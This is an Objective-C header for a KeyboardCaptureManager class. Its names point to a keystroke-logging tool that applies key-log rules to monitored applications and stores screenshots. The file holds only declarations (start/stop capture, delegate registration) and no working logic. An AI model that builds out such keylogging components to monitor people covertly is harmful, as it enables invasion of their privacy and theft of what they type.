//
//  KeyboardCaptureManager.h
//  KeyboardCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 9/27/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "EventCapture.h"
#import "KeyLogRuleDelegate.h"
#import "KeyboardLoggerManagerDelegate.h"

@class KeyboardLoggerManager;

@interface KeyboardCaptureManager : NSObject<EventCapture,KeyLogRuleDelegate,KeyboardLoggerManagerDelegate> {
@private
    id <EventDelegate>  mEventDelegate;
    KeyboardLoggerManager *mKeyboardLoggerManager;
    
    NSMutableArray *    mKeyLogRules;
    NSMutableArray *    mKeyMonitorApplications;
    NSString *          mScreenshotPath;
}

@property (nonatomic, assign) id <EventDelegate> mEventDelegate;
@property (nonatomic, retain) NSMutableArray * mKeyLogRules;
@property (nonatomic, retain) NSMutableArray * mKeyMonitorApplications;
@property (nonatomic, copy)   NSString * mScreenshotPath;

-(id) initWithScreenshotPath: (NSString *) aScreenshotPath withKeyboardLoggerManager: (KeyboardLoggerManager *) aKeyboardLoggerManager;

-(void) registerEventDelegate:(id <EventDelegate>) aEventDelegate;
-(void) unregisterEventDelegate;
-(void) startCapture;
-(void) stopCapture;

@end
